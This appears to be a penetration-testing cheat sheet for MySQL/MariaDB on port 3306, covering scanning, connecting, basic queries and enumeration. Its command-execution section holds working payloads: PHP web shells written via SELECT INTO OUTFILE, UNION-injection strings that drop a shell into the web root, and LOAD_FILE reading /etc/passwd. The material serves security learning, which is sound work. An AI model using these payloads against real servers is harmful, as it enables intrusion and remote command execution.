---
title: 3306 mariadb mysql
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - mariadb
  - port 3306
  - mysql
---

# 3306 mariaDB - mySQL

## Description

**MySQL**: MySQL is an open-source relational database management system(RDBMS) based on Structured Query Language (SQL). It is developed and managed by oracle corporation and initially released on 23 may, 1995. It is widely being used in many small and large scale industrial applications and capable of handling a large volume of data. After the acquisition of MySQL by Oracle, some issues happened with the usage of the database and hence MariaDB was developed.

**MariaDB**: MariaDB is an open source relational database management system (RDBMS) that is a compatible drop-in replacement for the widely used MySQL database technology. It is developed by MariaDB Foundation and initially released on 29 October 2009. MariaDB has a significantly high number of new features, which makes it better in terms of performance and user-orientation than MySQL.


```shell-session
sudo nmap $ip -sV -sC -p3306 --script mysql*
```

```
sudo nmap -sS -sV --script mysql-empty-password -p 3306 $ip
```



## Connect to database: mariadb

```bash
# -h host/ip   
# -u user As default mariadb has a root user with no authentication
mariadb -h <host/IP> -u root
```


## Connect to database: mysql 

### From Linux

```bash
mysql -u username -p'Password123' -h $ip -P 3306 --skip-ssl-verify-server-cert
# -h host/ip   
# -u user As default mysql has a root user with no authentication
# If ERROR 2026 (HY000) TLS/SSL error shows up, we can append --skip-ssl at the end of the command to connect to the database.

mysql --host=INSTANCE_IP --user=root --password=thepassword
mysql -h <host/IP> -u root -p<password>
mysql -u root -h <host/IP>

mysql -u root -h example.com -P 3306 -p'Password123'
# -P: port
```

#### sqsh

```shell-session
# Targeting a local account:
sqsh -S $ip -U <username> -P 'MyPassword!' -h

# Targeting Windows authentication
sqsh -S $ip -U .\\username -P 'MyPassword!' -h
# -h: disable headers and footers for a cleaner look.
```

#### mssqlclient.py from impacket 

We can run impacket-mssqlclient to connect to the remote Windows machine running MSSQL by providing a username, a password, and the remote IP, together with the -windows-auth keyword. This forces NTLM authentication (as opposed to Kerberos).

```bash
mssqlclient.py -p $port username@$ip 

#Example: impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
```

If we can guess or gain access to credentials, this allows us to remotely connect to the MSSQL server and start interacting with databases using T-SQL (`Transact-SQL`). Authenticating with MSSQL will enable us to interact directly with databases through the SQL Database Engine. From Pwnbox or a personal attack host, we can use Impacket's mssqlclient.py to connect as seen in the output below. Once connected to the server, it may be good to get a lay of the land and list the databases present on the system.

```bash
python3 mssqlclient.py Administrator@$ip -windows-auth  
# With python3 mssqlclient.py help you can see more options.
```


### From windows

#### mysql.exe

```powershell
mysql.exe -u username -pPassword123 -h $IP
```

#### sqlcmd

```powershell
sqlcmd -S <server> -U <username> -P 'MyPassword!' -y 30 -Y 30
# When we authenticate to MSSQL using `sqlcmd` we can use the parameters `-y` (SQLCMDMAXVARTYPEWIDTH) and `-Y` (SQLCMDMAXFIXEDTYPEWIDTH) for better looking output. Keep in mind it may affect performance.
```

## Mariadb basic commands

```bash
# Get all databases
show databases;

# Select a database
use <databaseName>;

# Get all tables from the previously selected database
show tables; 

# Dump columns from a table
describe <table_name>;

# Dump columns from a table
show columns from <table>;

# Select column from table
select usename,password from users;
```

## mysql basic commands

See [mysql](mysql.md).


```mysql
# Show datases
SHOW databases;

# Show tables
SHOW tables;

# Create new database
CREATE DATABASE nameofdatabase;

# Delete database
DROP DATABASE nameofdatabase;

# Select a database
USE nameofdatabase;

# Show tablesç
SHOW tables;

# Dump content from nameOftable
SELECT * FROM NameOfTable

# Create a table with some columns in the previously selected database
CREATE TABLE person(nombre VARCHAR(255), edad INT, id INT);

# Modify, add, or remove a column attribute of a table
ALTER TABLE persona MODIFY edad VARCHAR(200);
ALTER TABLE persona ADD description VARCHAR(200);
ALTER TABLE persona DROP edad VARCHAR(200);

# Insert a new row with values in a table
INSERT INTO persona VALUES("alvaro", 54, 1);

# Show all rows from table
SELECT * FROM persona

# Select a row from a table filtering by the value of a given column
SELECT * FROM persona WHERE nombre="alvaro";

# JOIN query
SELECT * FROM oficina JOIN persona ON persona.id=oficina.user_id;

# UNION query. This means, for an attack, that the number of columns has to be the same
SELECT * FROM oficina UNION SELECT * from persona;
```


### Enumeration queries 

```mysql
# retrieve the version of the running SQL instance.
select version();

# verify the current database user for the ongoing session via the system_user() function, which returns the current username and hostname for the MySQL connection.
select system_user();

# Show current user
select current_user();
select user();

# Show current database
show databases();
```

## Command execution

### Upload a shell 

Take a wordpress installation that uses a mysql database. If you manage to login into the mysql panel (/phpmyadmin) as root then you could upload a php shell to the /wp-content/uploads/ folder.

```mysql
Select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php";
```

Another example: 

**To be able to write files to the back-end server using a MySQL database, we require three things:**

**1.** User with `FILE` privilege enabled. If our user is root:

```sql
SELECT grantee, privilege_type FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```

**2.**  MySQL global `secure_file_priv` variable not enabled

```sql
SHOW VARIABLES LIKE 'secure_file_priv';

# Final SQL query
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"

# In an example of an UNION query attack:
# cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -

```

The [secure_file_priv](https://mariadb.com/kb/en/server-system-variables/#secure_file_priv) variable is used to determine where to read/write files from. MariaDB has this variable set to empty by default, which lets us read/write to any file if the user has the `FILE` privilege. However, `MySQL` uses `/var/lib/mysql-files` as the default folder. This means that reading files through a `MySQL` injection isn't possible with default settings.

**3.**  Write access to the location we want to write to on the back-end server. The [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) statement can be used to write data from select queries into files. This is usually used for exporting data from tables.

```sql
SELECT * from users INTO OUTFILE '/tmp/credentials';

# This will create a test.txt file owned by the mysql user
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';

# Example in an UNION injection attack:
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```

**Tip**: Advanced file exports utilize the 'FROM_BASE64("base64_data")' function in order to be able to write long/advanced files, including binary data.

Now, uploading a shell. This is a PHP shell:

```php
<?php system($_REQUEST[0]); ?>
```

Let's replicate the UNION injection attack:

```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

This can be verified by browsing to the `/shell.php` file and executing commands via the `0` parameter, with `?0=id` in our URL:

```html
https://$ip:$port/shell.php?0=id
```



### Writing files

`MySQL` supports [User Defined Functions](https://dotnettutorials.net/lesson/user-defined-functions-in-mysql/) which allows us to execute C/C++ code as a function within SQL, there's one User Defined Function for command execution in this [GitHub repository](https://github.com/mysqludf/lib_mysqludf_sys).

`MySQL` does not have a stored procedure like `xp_cmdshell`, but we can achieve command execution if we write to a location in the file system that can execute our commands. So basically, we need to check if we have enough privileges to do so. 

In MySQL, a global system variable secure_file_priv limits the effect of data import and export operations, such as those performed by the LOAD DATA and SELECT … INTO OUTFILE statements and the LOAD_FILE() function. 

If `secure_file_priv` is set as:

- *set to NUL*: the server disables import and export operations. We can't do anything.
- *set to the name of a directory*: the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
- *is empty*: the variable has no effect, which is not a secure setting. 

Example:

```shell-session
mysql> show variables like "secure_file_priv";

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+

1 row in set (0.005 sec)
```


Now, as for demo purposes, let's imagine that `MySQL` operates on a PHP-based web server or other programming languages like ASP.NET, having  the appropriate privileges, we will attempt to write a file using [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) in the webserver directory. 
 
```mysql
# Browse to the location where the file is and execute the commands.
 SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

### Reading files

#### MySQL - Read Local Files in MySQL

If permissions allows it:

```shell-session
select LOAD_FILE("/etc/passwd");
```


